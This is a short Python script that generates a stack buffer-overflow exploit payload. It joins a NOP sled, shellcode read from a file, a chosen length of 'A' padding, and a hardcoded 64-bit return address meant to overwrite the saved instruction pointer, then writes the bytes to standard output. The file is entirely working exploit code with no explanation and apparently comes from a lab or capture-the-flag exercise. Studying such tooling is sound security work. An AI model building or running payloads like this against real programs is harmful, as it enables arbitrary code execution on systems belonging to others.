#!/usr/bin/python3
import struct
import sys

NOP = b'\x90' * 16

with open(sys.argv[1], mode="rb") as shellcode:
    shellcode = shellcode.read()
    
pad  = b'\x41' * int(sys.argv[2])


EIP = struct.pack("Q", 0x7fffffffdfc9)

sys.stdout.buffer.write(NOP + shellcode + pad + EIP )

